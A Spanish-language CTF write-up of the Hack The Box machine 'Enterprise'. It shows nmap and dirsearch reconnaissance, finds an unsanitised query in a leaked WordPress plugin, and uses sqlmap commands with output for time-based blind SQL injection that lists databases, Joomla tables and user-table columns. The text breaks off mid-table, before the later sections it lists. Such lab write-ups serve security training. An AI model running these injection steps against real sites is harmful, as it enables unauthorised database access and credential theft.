<!DOCTYPE html>
<head>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
    <link rel="icon" type="image/png" href="/images/LL2.png" />
<link rel="shortcut icon" type="image/png" href="/images/LL2.png" />

    
    
    <title>Rug4lo</title>
    
    
    <meta name="author" content="Rug4lo" /> 
     
    
    <meta name="description" content="Rug4lo&#39;s Website" /> 
    
    
    <meta name="keywords" content="Debugging, SQLI Blind, SQLI Time Based, Pivoting, BoF, Ret2libc" />
    
    <meta property="og:title" content="HTB - Enterprise" />
<meta property="og:description" content="Contenido Reconocimiento Apache Debugging SQLI Blind Time Based Joomla Exploitation User escalation BoF - Ret2libc Reconocimiento Empezamos con el típico escaneo de Nmap para descubrir los puertos, y luego usaremos los scripts básicos de reconocimiento de nmap para cada puerto descubierto (en mi caso estoy usando el parámetro -oN para dejar un archivo con la información del escaneo)
❯ nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61 # Nmap 7.94SVN scan initiated Thu Mar 21 17:26:58 2024 as: nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://rug4lo.github.io/htb/2023/05/htb-enterprise/" /><meta property="article:section" content="htb" />
<meta property="article:published_time" content="2023-05-01T07:28:17+08:00" />
<meta property="article:modified_time" content="2023-05-01T07:28:17+08:00" />


    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HTB - Enterprise"/>
<meta name="twitter:description" content="Contenido Reconocimiento Apache Debugging SQLI Blind Time Based Joomla Exploitation User escalation BoF - Ret2libc Reconocimiento Empezamos con el típico escaneo de Nmap para descubrir los puertos, y luego usaremos los scripts básicos de reconocimiento de nmap para cada puerto descubierto (en mi caso estoy usando el parámetro -oN para dejar un archivo con la información del escaneo)
❯ nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61 # Nmap 7.94SVN scan initiated Thu Mar 21 17:26:58 2024 as: nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10."/>
<meta name="twitter:site" content="@onevcat"/>


    
    
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css" />
    
    

    
    
    <link rel="stylesheet" href="https://rug4lo.github.io/scss/main.min.f858a4eaa0f050b4645575705ca4a5ec2f862d81e81b8c9b54b6a3ecda306484.css" integrity="sha256-&#43;Fik6qDwULRkVXVwXKSl7C&#43;GLYHoG4ybVLaj7NowZIQ=" crossorigin="anonymous" media="screen">
	<link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
</head>
  
</head>
<body>

  <script>
    
    var mensaje = document.createElement('div');
    mensaje.className = 'mobile-message';
    mensaje.innerHTML = 'Esta página no esta pensada para dispositivos móviles. Por favor, visita desde un ordenador.';
    document.body.appendChild(mensaje);
  </script>
  
  <header class="  panel-cover panel-cover--collapsed " style="background-image: url('/images/background-cover.jpg')">

    <div class="panel-main">
  
      <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">
  
          <a href="/#blog" title="Homepage of Rug4lo " class="blog-button"><img src="/images/avatar.jpg" width="80" alt="Rug4lo logo" class="panel-cover__logo logo" /></a>
          <h1 class="panel-cover__title panel-title"><a href="/#blog" title="Homepage of Rug4lo" class="blog-button">Rug4lo</a></h1>
          <hr class="panel-cover__divider" />
        <p class="panel-cover__description">Hacker  •  Red teamer  •  Pentester</p>
          <hr class="panel-cover__divider panel-cover__divider--secondary" /> 
          <div class="navigation-wrapper">
            <div>
              <nav class="cover-navigatio cover-navigation--primary">
                <ul class="navigation">
                  <li class="navigation__item"><a href="/writeups" title='Writeups' class="sblog-button">Writeups</a></li>
                  <li class="navigation__item"><a href="/blog" title='Blog' class="sblog-button">Blog</a></li>
                  <li class="navigation__item"><a href="/#whoami" title='Whoami' class="blog-button">About</a></li>
                </ul>
              </nav>
            </div>
              <div>
                <nav class="cover-navigatio cover-navigation--primary">
                  <ul class="navigation">
                    <li class="navigation__item"><a href="https://app.hackthebox.com/users/1478590" title="Rug4lo" target="_blank" class="sblog-button">HTB</a></li>
                    <li class="navigation__item"><a href="/" title='Home' class="sblog-button">Home</a></li>
                  </ul>
                </nav>
              </div>
            
            <div><nav class="cover-navigation navigation--social">
    <ul class="navigation">
  
    
    
    <li class="navigation__item">
      <a href="https://github.com/Rug4lo" title="Github" target="_blank">
        <i class='social fa fa-github'></i>
        <span class="label">Github</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="https://www.linkedin.com/in/ruben-garcia-lopez-aka-rug4lo-055496279" title="Linkedin" target="_blank">
        <i class='social fa fa-linkedin'></i>
        <span class="label">Linkedin</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="mailto:rubengarciavalladolid@gmail.com" title="Correo Electronico" target="_blank">
        <i class='social fa fa-envelope'></i>
        <span class="label">Email</span>
      </a>
    </li>
    
  
    </ul>
  </nav>
  </div>
          </div>
        </div>
      </div>
      
      
      <div class="panel-cover--overlay cover-red"></div>
      
    </div>
  </header>
  


  <div class="content-wrapper">
    <div class="content-wrapper__inner">

        
<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
    <header class="post-header">
        <br>
        <br>
        <h1 class="post-title">HTB - Enterprise</h1>
    </header>
    <section class="post">
        <p><img src="/htb/Enterprise/images/logo.png" alt="Enterprise"></p>
<h2 id="contenido">Contenido</h2>
<ul>
<li><a href="#Reconocimiento">Reconocimiento</a></li>
<li><a href="#Apache">Apache</a></li>
<li><a href="#Debugging">Debugging</a></li>
<li><a href="#SQLI">SQLI Blind Time Based</a></li>
<li><a href="#joomla">Joomla Exploitation</a></li>
<li><a href="#user">User escalation</a></li>
<li><a href="#bof">BoF - Ret2libc</a></li>
</ul>
<h2 id="Reconocimiento">Reconocimiento</h2>
<p>Empezamos con el típico escaneo de <code>Nmap</code> para descubrir los puertos, y luego usaremos los scripts básicos de reconocimiento de nmap para cada puerto descubierto (en mi caso estoy usando el parámetro -oN para dejar un archivo con la información del escaneo)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Thu Mar 21 17:26:58 2024 as: nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.61
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp    open  http     Apache httpd 2.4.10 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.10 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-generator: WordPress 4.8.1
</span></span><span style="display:flex;"><span>|_http-title: USS Enterprise &amp;<span style="color:#75715e">#8211; Ships Log</span>
</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http Apache httpd 2.4.25 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>enterprise.local/organizationName<span style="color:#f92672">=</span>USS Enterprise/stateOrProvinceName<span style="color:#f92672">=</span>United Federation of Planets/countryName<span style="color:#f92672">=</span>UK
</span></span><span style="display:flex;"><span>| Not valid before: 2017-08-25T10:35:14
</span></span><span style="display:flex;"><span>|_Not valid after:  2017-09-24T10:35:14
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style="display:flex;"><span>8080/tcp  open  http     Apache httpd 2.4.10 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>| http-open-proxy: Potentially OPEN proxy.
</span></span><span style="display:flex;"><span>|_Methods supported:CONNECTION
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.10 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">15</span> disallowed entries 
</span></span><span style="display:flex;"><span>| /joomla/administrator/ /administrator/ /bin/ /cache/ 
</span></span><span style="display:flex;"><span>| /cli/ /components/ /includes/ /installation/ /language/ 
</span></span><span style="display:flex;"><span>|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
</span></span><span style="display:flex;"><span>|_http-title: Home
</span></span><span style="display:flex;"><span>|_http-generator: Joomla! - Open Source Content Management
</span></span><span style="display:flex;"><span>32812/tcp open  unknown
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GenericLines, GetRequest, HTTPOptions: 
</span></span><span style="display:flex;"><span>|     _______ _______ ______ _______
</span></span><span style="display:flex;"><span>|     |_____| |_____/ |______
</span></span><span style="display:flex;"><span>|     |_____ |_____ | | | _ ______|
</span></span><span style="display:flex;"><span>|     Welcome to the Library Computer Access and Retrieval System
</span></span><span style="display:flex;"><span>|     Enter Bridge Access Code: 
</span></span><span style="display:flex;"><span>|     Invalid Code
</span></span><span style="display:flex;"><span>|     Terminating Console
</span></span><span style="display:flex;"><span>|   NULL: 
</span></span><span style="display:flex;"><span>|     _______ _______ ______ _______
</span></span><span style="display:flex;"><span>|     |_____| |_____/ |______
</span></span><span style="display:flex;"><span>|     |_____ |_____ | | | _ ______|
</span></span><span style="display:flex;"><span>|     Welcome to the Library Computer Access and Retrieval System
</span></span><span style="display:flex;"><span>|_    Enter Bridge Access Code:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port32812-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>3/21%Time<span style="color:#f92672">=</span>65FC5FD9%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%
</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>NULL,ED,<span style="color:#e6db74">&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Com
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:puter\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Acc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ess\x20Code:\x20\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,110,<span style="color:#e6db74">&#34;\n\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20_____
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:_\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|_____
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:_\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sy
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:stem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTerm
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:inating\x20Console\n\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,110,<span style="color:#e6db74">&#34;\n\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rminating\x20Console\n\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,110,<span style="color:#e6db74">&#34;\n\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:______\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWel
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:come\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nTerminating\x20Console\n\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Thu Mar 21 17:27:17 2024 -- 1 IP address (1 host up) scanned in 18.56 seconds</span>
</span></span></code></pre></div><p>Podemos ver que hay 3 paginas webs en esta maquina, a parte hay un puerto <code>32812</code> que esta corriendo un programa personalizado llamado lcars (podemos conectarnos a este puerto con net-cat)</p>
<p>Vamos a abrir cada pagina e inspeccionarlas con whatweb, con eso veremos que hay un Apache base, un wordpress y un joomla</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://enterprise.htb
</span></span></code></pre></div><h2 id="Apache">Apache</h2>
<p>Vamos a empezar a inspeccionar el <code>Apache</code>, ya que es la que parece mas simple, primero usaremos dirsearch para ver los dominios de la web</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ dirsearch -u https://enterprise.htb/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.3
</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">25</span> | Wordlist size: <span style="color:#ae81ff">11460</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Output File: /home/rugalo/Desktop/rugalo/maquinas/htb/linux/Enterprise/nmap/reports/https_enterprise.htb/__24-03-24_15-34-51.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: https://enterprise.htb/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:51<span style="color:#f92672">]</span> Starting: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /.ht_wsr.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  304B  - /.htaccess.bak1
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  304B  - /.htaccess.orig
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  306B  - /.htaccess.sample
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  304B  - /.htaccess.save
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  304B  - /.htaccess_orig
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  302B  - /.htaccessBAK
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  302B  - /.htaccess_sc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  305B  - /.htaccess_extra
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  302B  - /.htaccessOLD
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  303B  - /.htaccessOLD2
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  295B  - /.html
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  301B  - /.httr-oauth
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  294B  - /.htm
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  304B  - /.htpasswd_test
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  300B  - /.htpasswds
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:59<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  294B  - /.php
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:34:59<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  295B  - /.php3
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:36:29<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  318B  - /files  -&gt;  https://enterprise.htb/files/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:36:29<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  457B  - /files/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:37:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  303B  - /server-status
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:37:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  304B  - /server-status/
</span></span></code></pre></div><p>Con esto vamos a ver que hay un <code>/files</code>, si nos metemos a este subdirectorio, veremos esto:</p>
<p><img src="/htb/Enterprise/images/1.png" alt="Enterprise"></p>
<p>Este archivo lcars.zip es interesante, nos lo podemos descargar y descomprimirlo, esto nos dará tres archivos</p>
<p><img src="/htb/Enterprise/images/2.png" alt="Enterprise"></p>
<h2 id="Debugging">Debugging</h2>
<p>Si vemos el primer archivo veremos que estos archivos php son de un plugin, muy probablemente de <code>WordPress</code></p>
<p><img src="/htb/Enterprise/images/3.png" alt="Enterprise"></p>
<p>Los dos archivos restantes tienen pinta de ser los archivos de como funciona el <code>plugin</code></p>
<p>lcars_db.php</p>
<p><img src="/htb/Enterprise/images/4.png" alt="Enterprise"></p>
<p>lcars_dbpost.php</p>
<p><img src="/htb/Enterprise/images/5.png" alt="Enterprise"></p>
<p>Si los inspeccionamos veremos que usan una query de MySQL la cual no esta sanitizada en el archivo <code>lcars_db.php</code></p>
<p>Por lo que podemos intentar acceder a los archivos en la pagina web del <code>WordPress</code></p>
<p><img src="/htb/Enterprise/images/6.png" alt="Enterprise"></p>
<h2 id="SQLI">SQLI Blind Time Based</h2>
<p>Vemos que somos capaces de acceder, por lo que podemos intentar inyectar algun <code>id</code> (ya que este script supuesta mente te da los datos de un usuario por su id)</p>
<p><img src="/htb/Enterprise/images/7.png" alt="Enterprise"></p>
<p>Vemos que no esta funcionando, pero podemos intentar una <code>SQLI</code>, en este caso estoy intentando ver si me hace una espera de 5 segundos al recargar la pagina</p>
<p><img src="/htb/Enterprise/images/8.png" alt="Enterprise"></p>
<p>Veremos como la pagina tarda en responder los 5 segundos por lo que es vulnerable a <code>SQLI</code>, pero si nos ponemos a intentar listar las bases de datos veremos que no nos representara información, por lo que es muy probable que se trate de una <code>Blind SQLI</code> basada en tiempo</p>
<p>Para esto podemos hacer un script en python, pero va a ser muy lento, por lo que podemos usar <code>Sqlmap</code> para listar las bases de datos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#39;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#39;</span> --dbs --batch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>available databases <span style="color:#f92672">[</span>8<span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> joomla
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> joomladb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mysql
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> wordpress
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> wordpressdb
</span></span></code></pre></div><p>Podemos ver muchas bases de datos, pero las que nos interesan son la <code>joomladb</code> y la <code>wordpress</code> (ya que las otras están vacías,) por lo que procederemos a sacar toda las tablas de la base de datos joomladb</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#39;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#39;</span> --dbs --batch -dbms mysql -D joomladb --tables
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>| edz2g_ucm_content             |
</span></span><span style="display:flex;"><span>| edz2g_ucm_history             |
</span></span><span style="display:flex;"><span>| edz2g_update_sites            |
</span></span><span style="display:flex;"><span>| edz2g_update_sites_extensions |
</span></span><span style="display:flex;"><span>| edz2g_updates                 |
</span></span><span style="display:flex;"><span>| edz2g_user_keys               |
</span></span><span style="display:flex;"><span>| edz2g_user_notes              |
</span></span><span style="display:flex;"><span>| edz2g_user_profiles           |
</span></span><span style="display:flex;"><span>| edz2g_user_usergroup_map      |
</span></span><span style="display:flex;"><span>| edz2g_usergroups              |
</span></span><span style="display:flex;"><span>| edz2g_users                   |
</span></span><span style="display:flex;"><span>| edz2g_utf8_conversion         |
</span></span><span style="display:flex;"><span>| edz2g_viewlevels              |
</span></span><span style="display:flex;"><span>+-------------------------------+
</span></span></code></pre></div><p>Vemos la base de datos <code>edz2g_users</code> por lo que vamos a listar toda la información de esta</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#39;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#39;</span> --dbs --batch -dbms mysql -D joomladb -T edz2g_users --columns
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+---------------+---------------+
</span></span><span style="display:flex;"><span>| Column        | Type          |
</span></span><span style="display:flex;"><span>+---------------+---------------+
</span></span><span style="display:flex;"><span>| block         | tinyint<span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>    |
</span></span><span style="display:flex;"><span>| name          | varchar<span style="color:#f92672">(</span>400<span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>| activation    | varchar<span style="color:#f92672">(</span>100<span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>| email         | varchar<span style="color:#f92672">(</span>100<span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>| id            | int<span style="color:#f92672">(</span>11<span style="color:#f92672">)</span>       |
</span></span><span style="display:flex;"><span>| lastResetTime | datetime      |
</span></span><span style="display:flex;"><span>| lastvisitDate | datetime      |
</span></span><span style="display:flex;"><span>| otep          | varchar<span style="color:#f92672">(</span>1000<span style="color:#f92672">)</span> |
